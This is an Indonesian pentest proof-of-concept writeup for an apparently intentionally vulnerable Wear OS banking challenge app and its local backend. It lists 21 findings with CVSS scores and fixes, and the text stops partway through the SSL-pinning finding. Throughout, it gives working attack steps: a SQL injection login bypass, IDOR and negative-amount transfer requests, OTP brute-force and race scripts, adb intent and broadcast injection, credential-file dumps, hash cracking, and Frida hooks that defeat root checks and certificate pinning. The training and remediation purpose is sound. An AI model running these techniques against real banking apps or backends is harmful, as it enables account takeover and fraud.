# 📝 WRITEUP POC — Nexora OmniWear Wear OS Challenge Suite

Writeup per-temuan (Proof of Concept) untuk seluruh *challenge* keamanan di aplikasi **Nexora Bank OmniWear** (`com.nexorabank.omniwear`).
Disusun **dari yang paling mudah ke paling sulit** direproduksi. Setiap temuan memakai format: *Nama Temuan → Severity → CVSS v4.0 → Kategori → Deskripsi → Dampak → Step-by-Step Reproduksi → Rekomendasi → Referensi*.

> **Dokumen pendamping:** [`PANDUAN-DEMO-PENTEST.md`](PANDUAN-DEMO-PENTEST.md) — berisi setup lingkungan (Metode 0–D), setup Frida, dan cheatsheet. Nomor `§N` di tiap "Referensi" mengacu ke *Skenario N* di panduan tersebut.

---

## ⚙️ Prasyarat Umum (baca sekali)

| Hal | Nilai |
|---|---|
| Backend | `python backend/server.py` → `http://0.0.0.0:5000` (dari PC: `http://127.0.0.1:5000`) |
| Akun korban | `alexander.vance` / `Password123!` — akun admin `NX-8492014`, saldo awal **Rp 100.000.000** |
| Jam (victim) | Emulator Wear OS `emulator-5554` (x86_64, bisa `adb root`) |
| HP (companion) | Android fisik non-root — jangkau backend via `adb -s <HP_ID> reverse tcp:5000 tcp:5000` lalu `http://localhost:5000` |
| Aturan `am broadcast` | **WAJIB** `-p com.nexorabank.omniwear` (Android 8+), kalau tidak → `result=0` tanpa efek |
| Frida | `frida -D emulator-5554 ...` (server v-cocok berjalan di emulator; lihat panduan Metode D) |

**Legenda tingkat kesulitan reproduksi:**
🟢 **Mudah** = cukup 1 perintah `curl` (tanpa perangkat/root) · 🟡 **Menengah** = butuh `adb`/aplikasi di perangkat · 🔴 **Lanjutan** = butuh Frida + root emulator.

**Legenda perangkat:** 🖥️ *Backend-API* · ⌚ *Single-Device (jam saja)* · 📱+⌚ *Companion-Assisted (HP + jam)*.

---

## 🗺️ Indeks Temuan (urut termudah → tersulit)

| # | Temuan | V-ID | Sulit | Perangkat | Metode inti | CVSS v4.0 |
|---|---|---|---|---|---|---|
| 1 | SQL Injection Authentication Bypass | — | 🟢 | 🖥️ | 1× curl | 9.3 Critical |
| 2 | Broken Object Level Authorization (BOLA/IDOR) | — | 🟢 | 🖥️ | 1× curl | 8.7 High |
| 3 | Negative-Amount Transfer Logic Flaw | — | 🟢 | 🖥️ | 1× curl | 9.2 Critical |
| 4 | Unauthenticated Health Telemetry Exfiltration | V-W04 | 🟢 | 🖥️ | 1× curl | 8.2 High |
| 5 | Emergency Card-Freeze Kill-Switch Desync | — | 🟢 | 🖥️ | 1× curl | 7.1 High |
| 6 | Dynamic QRIS Token Replay | V-W15 | 🟢 | 🖥️+⌚ | curl ×2 | 8.2 High |
| 7 | 2FA Push Authorization Replay | V-B04 | 🟢 | 🖥️ | curl (replay) | 9.2 Critical |
| 8 | Cardless-ATM OTP Brute-Force | — | 🟡 | ⌚+🖥️ | gen + curl loop | 8.2 High |
| 9 | Cardless-ATM Race Condition (Double-Dispense) | V-L04 | 🟡 | ⌚+🖥️ | parallel curl | 7.3 High |
| 10 | Insecure Deep Link Intent Injection | V-W07 | 🟡 | ⌚ | adb am start | 8.0 High |
| 11 | Translucent Tapjacking Overlay | V-W08 | 🟡 | ⌚ | adb am start | 6.5 Medium |
| 12 | Exported Quick-Pay Broadcast Injection | V-W06 | 🟡 | ⌚ | adb broadcast | 8.5 High |
| 13 | Public-Channel OTP Notification Snooping | V-W16 | 🟡 | ⌚ | adb broadcast | 6.1 Medium |
| 14 | Unencrypted BLE Balance Injection | V-B01/B02 | 🟡 | ⌚ / 📱+⌚ | adb / companion | 7.1 High |
| 15 | Cleartext Storage + Quick-PIN MD5 Brute-Force | V-W10 | 🟡 | ⌚ | run-as + brute | 8.1 High |
| 16 | Plaintext Health/PPG PII Storage | V-S04 | 🟡 | ⌚ | run-as | 7.1 High |
| 17 | Insecure Application Backup | V-W13 | 🟡 | ⌚ | root read | 6.1 Medium |
| 18 | High-Value OOB 2FA Wire Hijack | V-W09 | 🟡 | 📱+⌚ | companion + adb | 9.1 Critical |
| 19 | Client-Side Root / Anti-Tamper Bypass | V-07/R02 | 🔴 | ⌚ | in-app / Frida | 6.8 Medium |
| 20 | Wrist-Off Sensor Lockout Evasion | V-W11 | 🔴 | ⌚ | in-app / Frida | 6.5 Medium |
| 21 | Bank-Grade SSL Pinning Bypass | V-08 | 🔴 | ⌚ | Frida + Burp | 6.8 Medium |

---

# 🟢 TIER 1 — Mudah (Backend-API, cukup `curl`)

## 1. SQL Injection Authentication Bypass
- **Severity:** 🔴 Critical · **CVSS v4.0:** **9.3** — `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N`
- **Kategori:** CWE-89 (SQL Injection) · OWASP API8:2023 / Mobile M4
- **Deskripsi:** `POST /login` merangkai `username`/`password` langsung ke query SQL (`SELECT * FROM users WHERE username='{u}' AND password='{p}'`) tanpa parameterisasi.
- **Dampak:** Login sebagai admin tanpa password; server mengembalikan **Master JWT** → kendali penuh atas seluruh rekening.
- **Step-by-Step Reproduksi:**
  1. Pastikan backend jalan.
  2. Kirim payload dengan komentar SQL `'--` untuk membuang klausa password:
     ```bash
     curl -X POST http://127.0.0.1:5000/login -H "Content-Type: application/json" \
       -d '{"username":"alexander.vance'\''--","password":"apa_saja"}'
     ```
  3. **Amati:** respons `{"message":"Login successful","isAdmin":true,"token":"eyJ..."}` padahal password salah.
- **Rekomendasi:** Gunakan *parameterized query* / prepared statement; jangan pernah string-concat input ke SQL. Terapkan least-privilege pada akun DB.
- **Referensi:** `PANDUAN §14`; `backend/server.py` route `/login`.

---

## 2. Broken Object Level Authorization (BOLA / IDOR)
- **Severity:** 🟠 High · **CVSS v4.0:** **8.7** — `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N`
- **Kategori:** CWE-639 / OWASP API1:2023 (BOLA)
- **Deskripsi:** `GET /check_balance/<acct>` dan `GET /transactions/<acct>` tidak memvalidasi apakah pemanggil adalah pemilik rekening tersebut.
- **Dampak:** Siapa pun bisa membaca saldo & mutasi rekening nasabah lain hanya dengan mengganti nomor rekening di URL.
- **Step-by-Step Reproduksi:**
  1. Panggil rekening milik korban lain (bukan milik Anda):
     ```bash
     curl http://127.0.0.1:5000/check_balance/NX-7391048
     curl http://127.0.0.1:5000/transactions/NX-9201482
     ```
  2. **Amati:** saldo (`{"balance":52800000.0}`) dan daftar transaksi korban lain terbuka penuh.
- **Rekomendasi:** Validasi kepemilikan objek pada setiap request (bandingkan `account_number` dengan identitas di JWT); jangan percaya ID dari URL.
- **Referensi:** `PANDUAN §15`.

---

## 3. Negative-Amount Transfer Logic Flaw (Infinite Money)
- **Severity:** 🔴 Critical · **CVSS v4.0:** **9.2** — `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:H/SC:N/SI:N/SA:N`
- **Kategori:** CWE-840 (Business Logic Flaw)
- **Deskripsi:** `POST /transfer` tidak memvalidasi `amount > 0`. Transfer nominal **negatif** membalik arah aliran dana: `saldo - (-X) = saldo + X`.
- **Dampak:** Penyerang mencetak uang tanpa batas ke rekeningnya sendiri.
- **Step-by-Step Reproduksi:**
  1. Catat saldo awal: `curl http://127.0.0.1:5000/check_balance/NX-8492014` → `100000000`.
  2. Kirim transfer **negatif** (nominal besar agar dampak jelas):
     ```bash
     curl -X POST http://127.0.0.1:5000/transfer -H "Content-Type: application/json" \
       -d '{"from_account":"NX-8492014","to_account":"NX-7391048","amount":-50000000.0,"description":"Exploit"}'
     ```
  3. **Amati:** `new_balance` naik Rp 100.000.000 → **Rp 150.000.000**.
  > ⚠️ Skala: `-50000.0` hanya menambah **Rp 50.000** — gunakan nominal sesuai dampak yang ingin ditunjukkan.
- **Rekomendasi:** Validasi `amount > 0` dan tipe numerik di server; terapkan batas transfer & rekonsiliasi saldo.
- **Referensi:** `PANDUAN §16`; `backend/server.py` route `/transfer`.

---

## 4. Unauthenticated Health Telemetry Exfiltration
- **Severity:** 🟠 High · **CVSS v4.0:** **8.2** — `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:L/VA:N/SC:N/SI:N/SA:N`
- **Kategori:** CWE-200 (Information Disclosure) · UU PDP No. 27/2022
- **Deskripsi:** `POST /debug/heart` menerima & mencatat denyut jantung, SpO2, dan nomor rekening **tanpa autentikasi dan tanpa enkripsi**.
- **Dampak:** Data biometrik/medis + pemetaan ke rekening bocor ke log server publik; bisa disuntik/dipalsukan oleh siapa pun.
- **Step-by-Step Reproduksi:**
  1. Kirim telemetri palsu tanpa token apa pun:
     ```bash
     curl -X POST http://127.0.0.1:5000/debug/heart -H "Content-Type: application/json" \
       -d '{"account_number":"NX-8492014","readings":[{"bpm":115,"spo2":98}]}'
     ```
  2. **Amati:** respons `{"status":"received","logged_count":1}` dan data muncul di log server.
- **Rekomendasi:** Hapus endpoint debug dari rilis; wajibkan autentikasi + TLS; jangan log PII/biometrik.
- **Referensi:** `PANDUAN §12`; `src/screens/HealthScreen.tsx`.

---

## 5. Emergency Card-Freeze Kill-Switch Desynchronization
- **Severity:** 🟠 High · **CVSS v4.0:** **7.1** — `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N`
- **Kategori:** CWE-362 (State Inconsistency) / Missing Idempotency
- **Deskripsi:** Status beku/aktif kartu virtual (`/api/wearable/card-freeze`) dikirim tanpa autentikasi dan tanpa acknowledgment dua arah.
- **Dampak:** Penyerang bisa **mengaktifkan kembali** kartu yang baru saja dibekukan korban dari jam — menggagalkan kill-switch anti-fraud.
- **Step-by-Step Reproduksi:**
  1. (Opsional) Bekukan kartu dari jam (`is_frozen:1`).
  2. Buka beku secara sepihak:
     ```bash
     curl -X POST http://127.0.0.1:5000/api/wearable/card-freeze -H "Content-Type: application/json" \
       -d '{"card_id":1,"is_frozen":0}'
     ```
  3. **Amati:** `{"message":"Card #1 successfully updated to UNFROZEN from wrist."}`.
- **Rekomendasi:** Autentikasi + otorisasi pemilik kartu; idempotency key; konfirmasi dua arah; audit trail.
- **Referensi:** `PANDUAN §9`.

---

## 6. Dynamic QRIS Token Replay
- **Severity:** 🟠 High · **CVSS v4.0:** **8.2** — `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:L/SC:N/SI:N/SA:N`
- **Kategori:** CWE-294 (Replay) · BI SNAP PADG No. 24/1/PADG/2022
- **Deskripsi:** Payload QRIS yang dibuat jam tidak mengandung nonce/TOTP tervalidasi server, sehingga request checkout yang sama bisa dikirim ulang.
- **Dampak:** Satu kode QR bisa ditagihkan berkali-kali (double/triple charge) ke nasabah.
- **Step-by-Step Reproduksi:**
  1. (⌚) Buka layar **QR Pay** di jam untuk melihat payload QRIS.
  2. (🖥️) Kirim checkout **dua kali** dengan payload statis yang sama:
     ```bash
     curl -X POST http://127.0.0.1:5000/api/qris/checkout -H "Content-Type: application/json" \
       -d '{"account_number":"NX-8492014","amount":75.0,"merchant_name":"NEXORA MERCH 001","qr_payload":"00020101021226610016ID.NEXORA.WWW"}'
     ```
  3. **Amati:** kedua request `200 APPROVED` dengan **RRN identik** — bukti tidak ada proteksi replay.
- **Rekomendasi:** Ikat token QR dengan nonce/TOTP server (TTL ≤ 60 dtk) + tolak RRN/nonce duplikat.
- **Referensi:** `PANDUAN §6`.

---

## 7. 2FA Push Authorization Replay
- **Severity:** 🔴 Critical · **CVSS v4.0:** **9.2** — `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:H/SC:N/SI:N/SA:N`
- **Kategori:** CWE-294 (Replay) / Broken Auth · PCI-DSS v4.0 Req 8.3
- **Deskripsi:** `POST /api/wearable/authorize_2fa` tidak memvalidasi nonce/sequence/idempotency; payload approval bisa dikirim ulang.
- **Dampak:** Setiap replay mendebit korban Rp 50.000.000 lagi dan mendorong event balance ke jam secara real-time.
- **Step-by-Step Reproduksi:**
  1. Kirim (atau ulangi) payload approval high-value:
     ```bash
     curl -X POST http://127.0.0.1:5000/api/wearable/authorize_2fa -H "Content-Type: application/json" \
       -d '{"tx_id":"TX-HIGHVAL-9921","amount":50000000.0,"account_number":"NX-8492014","recipient":"CyberStore"}'
     ```
  2. Ulangi perintah yang sama beberapa kali.
  3. **Amati:** tiap kali `200 APPROVED`; `new_balance` turun Rp 50 juta setiap replay.
- **Rekomendasi:** Nonce sekali-pakai + idempotency key + binding ke sesi 2FA; tolak `tx_id` yang sudah diproses.
- **Referensi:** `PANDUAN §17`.

---

# 🟡 TIER 2 — Menengah (`adb` / aplikasi di perangkat, tanpa root)

## 8. Cardless-ATM OTP Brute-Force
- **Severity:** 🟠 High · **CVSS v4.0:** **8.2** — `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:H/SC:N/SI:N/SA:N`
- **Kategori:** CWE-307 (No Rate-Limit) + CWE-330 (Weak Randomness)
- **Deskripsi:** `/api/atm/cardless-cash/verify` tidak membatasi percobaan; token hanya 6 digit.
- **Dampak:** Token tarik-tunai aktif bisa ditebak → pencairan tunai tanpa kartu.
- **Step-by-Step Reproduksi:**
  1. (⌚) Di jam: **Cardless Cash → Generate ATM OTP** (membuat token aktif di DB).
  2. (🖥️) Jalankan brute-force rentang kode:
     ```python
     import requests
     for pin in range(100000, 100050):
         r = requests.post("http://127.0.0.1:5000/api/atm/cardless-cash/verify", json={"token": str(pin)})
         if r.status_code == 200: print("VALID:", pin); break
     ```
  3. **Amati:** satu kode mengembalikan `{"status":"DISPENSED","amount":...}` tanpa akun terkunci.
- **Rekomendasi:** Rate-limit + lockout; token ≥ panjang & acak kuat; TTL pendek; alert anomali.
- **Referensi:** `PANDUAN §8`.

---

## 9. Cardless-ATM Race Condition (Double-Dispense)
- **Severity:** 🟠 High · **CVSS v4.0:** **7.3** — `CVSS:4.0/AV:N/AC:H/AT:N/PR:N/UI:N/VC:N/VI:H/VA:H/SC:N/SI:N/SA:N`
- **Kategori:** CWE-362 (Race) / TOCTOU · PCI-DSS v4.0 Req 6.5
- **Deskripsi:** `verify` mengubah status token `ACTIVE→DISPENSED` tanpa row-locking/isolasi serializable → ada jendela balapan.
- **Dampak:** Dua request paralel sama-sama lolos → ATM mencairkan tunai **2×** untuk satu token.
- **Step-by-Step Reproduksi:**
  1. (⌚) Generate token (mis. `463544`).
  2. (🖥️) Kirim dua verify **bersamaan**:
     ```bash
     curl -s -X POST http://127.0.0.1:5000/api/atm/cardless-cash/verify -H "Content-Type: application/json" -d '{"token":"463544"}' & \
     curl -s -X POST http://127.0.0.1:5000/api/atm/cardless-cash/verify -H "Content-Type: application/json" -d '{"token":"463544"}'
     ```
  3. **Amati:** kedua respons `DISPENSED` → total tunai 2× nilai kupon.
- **Rekomendasi:** Pessimistic row-locking / transaksi serializable / `UPDATE ... WHERE status='ACTIVE'` atomik + cek `rowcount`.
- **Referensi:** `PANDUAN §21`.

---

## 10. Insecure Deep Link Intent Injection
- **Severity:** 🟠 High · **CVSS v4.0:** **8.0** — `CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:H/SC:N/SI:N/SA:N`
- **Kategori:** CWE-939 (Improper URL Authorization) · OWASP Mobile M3
- **Deskripsi:** `MainActivity` mendaftarkan skema `nexorabank://transfer` (exported) tanpa validasi pemanggil/sesi.
- **Dampak:** Aplikasi jahat lain (atau `adb`) memicu transfer tanpa interaksi korban.
- **Step-by-Step Reproduksi:**
  1. Pastikan app terinstal di jam.
  2. Picu deep link via adb (`am start` tidak perlu `-p`):
     ```bash
     adb -s emulator-5554 shell am start -a android.intent.action.VIEW \
       -d "nexorabank://transfer?to=ATTACKER_ACCOUNT&amount=500000&auto=true"
     ```
  3. **Amati:** transfer nyata tereksekusi ke backend (muncul di `GET /transactions/<acct>`) + toast konfirmasi.
- **Rekomendasi:** Verifikasi `android:autoVerify` + App Links tertandatangani; wajibkan sesi aktif & konfirmasi user untuk aksi finansial.
- **Referensi:** `PANDUAN §10`; `AndroidManifest.xml`, `MainActivity.kt`.

---

## 11. Translucent Tapjacking Overlay
- **Severity:** 🟡 Medium · **CVSS v4.0:** **6.5** — `CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:A/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N`
- **Kategori:** CWE-1021 (Improper UI Layer Restriction) · OWASP Mobile M1
- **Deskripsi:** Layar konfirmasi transaksi tidak menyetel `filterTouchesWhenObscured="true"`, sehingga bisa ditimpa overlay.
- **Dampak:** Korban tertipu menekan "Setujui" di bawah overlay transparan.
- **Step-by-Step Reproduksi:**
  1. Luncurkan activity demo tapjacking:
     ```bash
     adb -s emulator-5554 shell am start -n com.nexorabank.omniwear/.TapjackDemoActivity
     ```
  2. **Amati:** overlay tembus pandang muncul di atas tombol konfirmasi.
- **Rekomendasi:** `filterTouchesWhenObscured=true` / `setFilterTouchesWhenObscured` pada view sensitif; deteksi `FLAG_WINDOW_IS_OBSCURED`.
- **Referensi:** `PANDUAN §13`; `TapjackDemoActivity.kt`.

---

## 12. Exported Quick-Pay Broadcast Injection
- **Severity:** 🟠 High · **CVSS v4.0:** **8.5** — `CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:H/SC:N/SI:N/SA:N`
- **Kategori:** CWE-926 (Exported Component) · OWASP Mobile M5
- **Deskripsi:** `QuickPayReceiver` `exported="true"` tanpa permission `signature`. Siapa pun di perangkat bisa broadcast → transfer.
- **Dampak:** Debit rekening korban tanpa PIN, tercatat di ledger backend.
- **Step-by-Step Reproduksi:**
  1. Kirim broadcast **wajib `-p`**:
     ```bash
     adb -s emulator-5554 shell am broadcast -a com.nexorabank.omniwear.ACTION_QUICK_PAY \
       -p com.nexorabank.omniwear --es recipient "HACKER_WALLET" --ef amount 50000000.0
     ```
  2. **Amati:** logcat `W NEXORA_QUICK_PAY: ⚠️ EXPLOIT DETECTED (V-W06)`; saldo `NX-8492014` berkurang sesuai nominal.
  > Tanpa `-p`, perintah hanya cetak `result=0` tanpa efek (jebakan umum).
- **Rekomendasi:** `exported="false"` atau lindungi dengan custom permission `signature`; wajibkan verifikasi PIN.
- **Referensi:** `PANDUAN §11`; `QuickPayReceiver.kt`.

---

## 13. Public-Channel OTP Notification Snooping
- **Severity:** 🟡 Medium · **CVSS v4.0:** **6.1** — `CVSS:4.0/AV:P/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N`
- **Kategori:** CWE-200 (Exposure via Public Notification) · OWASP Mobile M6
- **Deskripsi:** `AuthBroadcastReceiver` menampilkan OTP penuh dengan `VISIBILITY_PUBLIC` di lockscreen/AOD.
- **Dampak:** OTP terbaca lewat *shoulder-surfing* tanpa membuka kunci jam.
- **Step-by-Step Reproduksi:**
  1. Kirim broadcast OTP (wajib `-p`):
     ```bash
     adb -s emulator-5554 shell am broadcast -a com.nexorabank.omniwear.ACTION_TRIGGER_OTP \
       -p com.nexorabank.omniwear --es otp "849201"
     ```
  2. **Amati:** notifikasi "Your OTP is: 849201" tampil penuh di layar terkunci.
- **Rekomendasi:** `VISIBILITY_PRIVATE`/`SECRET`; sensor konten sensitif di lockscreen.
- **Referensi:** `PANDUAN §20`; `AuthBroadcastReceiver.kt`.

---

## 14. Unencrypted BLE Balance Injection
- **Severity:** 🟠 High · **CVSS v4.0:** **7.1** — `CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N`
- **Kategori:** CWE-345 (Insufficient Authenticity) · PCI-DSS Req 4.1
- **Deskripsi:** `BluetoothSyncModule` memproses paket sync JSON tanpa HMAC/nonce/timestamp.
- **Dampak:** Saldo palsu disuntik ke tampilan jam → rekayasa sosial / penipuan "saldo masuk".
- **Step-by-Step Reproduksi:**
  1. **Buka aplikasi di jam** (receiver didaftarkan runtime).
  2. **Single-device (adb, wajib `-p`):**
     ```bash
     adb -s emulator-5554 shell am broadcast -a com.nexorabank.omniwear.ACTION_BT_SYNC \
       -p com.nexorabank.omniwear --es sync_payload '{"action":"UPDATE_BALANCE","amount":888888000.0}'
     ```
     **atau Companion (📱+⌚):** HP → **Phone Companion → Sync Balance to Watch**.
  3. **Amati:** logcat `[V-B01 EXPLOIT] Received unauthenticated BLE sync packet`; saldo tampil **Rp 888.888.000**.
- **Rekomendasi:** AES-256-GCM + HMAC + ECDH ephemeral key + validasi nonce/timestamp.
- **Referensi:** `PANDUAN §5`; `BluetoothSyncModule.kt`.

---

## 15. Cleartext Storage + Quick-PIN MD5 Brute-Force
- **Severity:** 🟠 High · **CVSS v4.0:** **8.1** — `CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N`
- **Kategori:** CWE-312 (Cleartext Storage) + CWE-916 (Weak Hash) + CWE-307
- **Deskripsi:** PIN disimpan sebagai **MD5 tanpa salt** di `quick_pin.xml`; kredensial & kunci di `NexoraVaultPrefs.xml`. Aplikasi `debuggable` → `run-as` tanpa root.
- **Dampak:** Dump SharedPreferences → crack PIN 4 digit (10.000 kombinasi) → akses penuh; JWT & secret key bocor.
- **Step-by-Step Reproduksi:**
  1. Dump sandbox via `run-as` (berfungsi di HP non-root maupun emulator):
     ```bash
     adb -s emulator-5554 shell "run-as com.nexorabank.omniwear cat shared_prefs/quick_pin.xml"
     ```
     → `pin_hash = 81dc9bdb52d04dc20036dbd8313ed055`.
  2. **Crack** — dua cara:
     - **In-app (termudah):** Jam → **Security Research Lab → Runtime → Run PIN Brute-Force (0000–9999)** → hasil `1234` + jumlah percobaan/ms (native asli).
     - **Offline:** `hashcat -m 0 -a 3 81dc9bdb52d04dc20036dbd8313ed055 ?d?d?d?d`.
  3. **Amati:** PIN = **1234**.
- **Rekomendasi:** `EncryptedSharedPreferences` + MasterKey (Keystore/StrongBox); hash lambat ber-salt (Argon2/bcrypt) *jika* PIN perlu disimpan; exponential backoff; `debuggable=false` di rilis.
- **Referensi:** `PANDUAN §3`; `PrefsHelper.java`, `SecurityCheckModule.kt`.

---

## 16. Plaintext Health / PPG PII Storage
- **Severity:** 🟠 High · **CVSS v4.0:** **7.1** — `CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N`
- **Kategori:** CWE-312 · UU PDP No. 27/2022 Pasal 4
- **Deskripsi:** `HeartRateModule` menulis telemetri PPG + nomor rekening ke `NexoraVaultPrefs.xml` (`health_telemetry_json`) tanpa enkripsi.
- **Dampak:** Malware/forensik perangkat mengambil data biometrik medis tertaut identitas finansial.
- **Step-by-Step Reproduksi:**
  1. Dump key telemetri:
     ```bash
     adb -s emulator-5554 shell "run-as com.nexorabank.omniwear cat shared_prefs/NexoraVaultPrefs.xml | grep health_telemetry_json"
     ```
  2. **Amati:** array JSON `bpm/stress_index/account_number` dalam plaintext.
- **Rekomendasi:** Enkripsi at-rest (Keystore); minimalkan retensi; pisahkan PII dari data finansial.
- **Referensi:** `PANDUAN §18`; `HeartRateModule.kt`.

---

## 17. Insecure Application Backup (`allowBackup="true"`)
- **Severity:** 🟡 Medium · **CVSS v4.0:** **6.1** — `CVSS:4.0/AV:P/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N`
- **Kategori:** CWE-530/CWE-312 · OWASP Mobile M9
- **Deskripsi:** `allowBackup="true"` tanpa `data-extraction-rules`. *Catatan:* `adb backup` sudah dinonaktifkan di **Android 12+** → tidak jalan di HP A13/14/16.
- **Dampak:** Pada perangkat lama / emulator: ekstraksi penuh sandbox (JWT, prefs, DB) tanpa root.
- **Step-by-Step Reproduksi:**
  1. **Terverifikasi (emulator rooted)** — baca sandbox langsung:
     ```bash
     adb -s emulator-5554 shell "su 0 cat /data/data/com.nexorabank.omniwear/shared_prefs/NexoraVaultPrefs.xml"
     ```
  2. *(Historis, perangkat < A12):* `adb backup -f nexora_vault.ab -noapk com.nexorabank.omniwear` lalu ekstrak `.ab`.
  3. **Amati:** seluruh prefs + token nasabah terbaca.
- **Rekomendasi:** `allowBackup="false"` atau `data-extraction-rules` yang mengecualikan kredensial.
- **Referensi:** `PANDUAN §19`; `AndroidManifest.xml`.

---

## 18. High-Value Out-of-Band 2FA Wire Hijack (Companion)
- **Severity:** 🔴 Critical · **CVSS v4.0:** **9.1** — `CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:H/SC:N/SI:N/SA:N`
- **Kategori:** CWE-287/CWE-306 (Insecure MFA) · OJK POJK 11/2022 Pasal 31
- **Deskripsi:** `AuthBroadcastReceiver` (exported) menyetujui wire 2FA tanpa biometrik; approval bisa dipicu lintas-perangkat.
- **Dampak:** Transfer Rp 50.000.000 ke `HACKER_SWIFT_CORP` disetujui tanpa sentuhan korban.
- **Step-by-Step Reproduksi (📱+⌚):**
  1. **Pairing dulu:** (⌚) login → menu **Companion Pairing** → kode `839-201` → **Link** (terdaftar `watch_9201`); biarkan jam di **Dashboard** (mem-poll event).
  2. (📱) HP → menu **Phone Companion** → **High-Value 2FA (Rp 50 Juta OOB)** → kartu 2FA muncul di jam.
  3. **Bypass persetujuan** (tanpa sentuh jam), wajib `-p`:
     ```bash
     adb -s emulator-5554 shell am broadcast -a com.nexorabank.omniwear.ACTION_APPROVE_2FA \
       -p com.nexorabank.omniwear --es session_id "WIRE_992144"
     ```
  4. **Amati:** backend mendebit Rp 50 juta; event balance terkirim ke jam.
- **Rekomendasi:** `BiometricPrompt` + kunci privat TEE/StrongBox untuk otorisasi; receiver non-exported; nonce per-transaksi.
- **Referensi:** `PANDUAN §4`; `AuthBroadcastReceiver.kt`.

---

# 🔴 TIER 3 — Lanjutan (Frida + root emulator)

> Prasyarat tier ini: `frida-server` berjalan di emulator (`frida-ps -D emulator-5554` memperlihatkan "Nexora Bank"). Lihat `PANDUAN` Metode D. Target hook sudah diverifikasi ada di APK.

## 19. Client-Side Root / Anti-Tamper Bypass
- **Severity:** 🟡 Medium · **CVSS v4.0:** **6.8** — `CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:N/SC:N/SI:H/SA:N`
- **Kategori:** CWE-693 (Protection Mechanism Failure) · OWASP Mobile M8
- **Deskripsi:** Deteksi root/Frida (`SecurityCheckModule`) berbasis string statis + flag SharedPreferences → mudah dilewati.
- **Dampak:** Menonaktifkan pertahanan client, membuka jalan exploit lain (Frida pinning/wrist-off).
- **Step-by-Step Reproduksi — dua cara:**
  - **In-app (termudah, tanpa Frida):** Jam → **Security Research Lab → Runtime → "V-R02: Invert Root Check Flag"** (menulis `bypass_root_check=true`).
  - **Frida:** simpan `bypass_root.js`:
     ```javascript
     Java.perform(function () {
       var S = Java.use("com.nexorabank.omniwear.SecurityCheckModule");
       S.isDeviceRooted.implementation = function(){ return false; };
       S.isFridaRunning.implementation = function(){ return false; };
     });
     ```
     ```bash
     frida -D emulator-5554 -f com.nexorabank.omniwear -l bypass_root.js
     ```
  - **Amati:** aplikasi berjalan normal di perangkat rooted/emulator tanpa peringatan.
- **Rekomendasi:** Play Integrity / hardware attestation server-side; jangan andalkan cek client-side saja.
- **Referensi:** `PANDUAN §2`; `SecurityCheckModule.kt`.

---

## 20. Wrist-Off Sensor Lockout Evasion
- **Severity:** 🟡 Medium · **CVSS v4.0:** **6.5** — `CVSS:4.0/AV:P/AC:L/AT:N/PR:N/UI:N/VC:H/VI:L/VA:N/SC:N/SI:N/SA:N`
- **Kategori:** CWE-287 (Biometric Attestation Failure) · ISO 27001 A.8.1
- **Deskripsi:** `HeartRateModule.isWristDetected()` hanya membaca sensor PPG lokal tanpa attestation; hook membuatnya selalu `true`.
- **Dampak:** Jam curian tetap terbuka penuh walau dilepas dari pergelangan (lockout gagal).
- **Step-by-Step Reproduksi — dua cara:**
  - **In-app (demo lock):** Jam → **Security Research Lab → Runtime → "V-W11: Simulate Wrist-Off (Lock)"** → layar terkunci (membuktikan jalur proteksi), lalu tunjukkan bypass di bawah.
  - **Frida (bypass):** `bypass_wrist.js`:
     ```javascript
     Java.perform(function () {
       Java.use("com.nexorabank.omniwear.HeartRateModule")
         .isWristDetected.implementation = function(){ return true; };
     });
     ```
     ```bash
     frida -D emulator-5554 -f com.nexorabank.omniwear -l bypass_wrist.js
     ```
  - **Amati:** walau sensor "off", app tetap tidak mengunci / tidak minta PIN ulang.
- **Rekomendasi:** Validasi kontinuitas sensor + challenge hardware berkala ke server; sesi berakhir saat off-body terverifikasi.
- **Referensi:** `PANDUAN §7`; `HeartRateModule.kt`.

---

## 21. Bank-Grade SSL Pinning Bypass
- **Severity:** 🟡 Medium · **CVSS v4.0:** **6.8** — `CVSS:4.0/AV:A/AC:H/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N`
- **Kategori:** CWE-295 (Improper Certificate Validation) · OWASP Mobile M8
- **Deskripsi:** Pinning via `okhttp3.CertificatePinner` dipasang di client tanpa integrity attestation → `check()` bisa di-override Frida.
- **Dampak:** Dekripsi penuh trafik HTTPS jam↔backend (MITM Burp) → panen JWT, payload transaksi.
- **Step-by-Step Reproduksi:**
  1. **Tunjukkan pinning aktif dulu (in-app):** Jam → **Security Research Lab → API → "Run Real Pinned Request"** → status **ENFORCED** (request diblok pinning asli).
  2. **Hook pinning** dengan Frida — `bypass_pinning.js`:
     ```javascript
     Java.perform(function () {
       var CP = Java.use("okhttp3.CertificatePinner");
       CP.check.overload('java.lang.String','java.util.List').implementation = function(h,c){ return; };
     });
     ```
